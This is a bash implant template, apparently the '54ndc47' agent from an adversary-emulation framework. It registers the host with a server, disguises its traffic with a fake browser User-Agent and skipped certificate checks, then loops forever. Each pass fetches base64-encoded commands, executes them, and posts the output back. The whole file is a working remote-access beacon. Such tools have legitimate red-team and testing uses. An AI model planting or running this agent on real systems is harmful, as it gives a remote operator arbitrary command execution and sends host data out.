#!/bin/bash

server='{{ url_root }}'
server_ip=$(sed -E 's/([a-zA-Z]{4,5}\:\/\/)(.*)(\:[0-9]{1,6})/\2/' <<< $server)
group='{{ group }}'
# {% raw %}
paw=$(hostname)$(whoami)
user_agent_string='User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36'

function getJsonVal () {
    python -c "import json,sys;sys.stdout.write(json.dumps(json.load(sys.stdin)$1))"
}

function registration {
    body=$(echo '{"paw":"'"$paw"'","host":"'"$(hostname)"'","executor":"bash","group":"'"$group"'"}' | base64)
    results=$(echo "$body" | curl --noproxy $server_ip -sk -X POST -H '$user_agent_string' -d @- $server/sand/register)
    register=$(base64 --decode <<< ${results})
}

function getInstructions {
    body=$(echo '{"paw":"'"$paw"'","host":"'"$(hostname)"'","executor":"bash"}' | base64)
    encodedTask=$(echo "$body" | curl --noproxy $server_ip -sk -X POST -H '$user_agent_string' -d @- $server/sand/instructions)
    task=$(base64 --decode <<< ${encodedTask})
}

function postResults {
    if [ -z "$task" ]; then
        echo "[54ndc47] server not accessible"
        sleep 60
    else
        taskId=$(echo "${task}" | getJsonVal "['id']")
        if [[ "$taskId" != "null" ]]; then
            taskCmd=$(echo "${task}" | getJsonVal "['command']" | tr -d '"')
            echo "[54ndc47] running workflow task..."
            decoded=$(base64 --decode <<< ${taskCmd})
            output=$(perl -e 'alarm shift @ARGV; exec "@ARGV"' 300 ${decoded})
            status=$(echo $?)
            encoded=$(echo "$output" | base64)
            body=$(echo '{"link_id":'"$taskId"',"paw":"'"$paw"'","output":"'"$encoded"'","status":'"$status"'}' | base64)
            echo "$body" | curl --noproxy $server_ip -sk -X POST -H '$user_agent_string' -o /dev/null -H "Content-Type: application/json" -d @- $server/sand/results
        fi
        sleep $(echo "${task}" | getJsonVal "['sleep']")
    fi
}

registration
if $(echo "$register" | getJsonVal "['status']"); then
    echo "[54ndc47] registration succeeded"
    while [ 1 ]
    do
        echo "[54ndc47] checking in with master"
        getInstructions
        postResults
    done
else
    echo "[54ndc47] registration failed"
fi
# {% endraw %}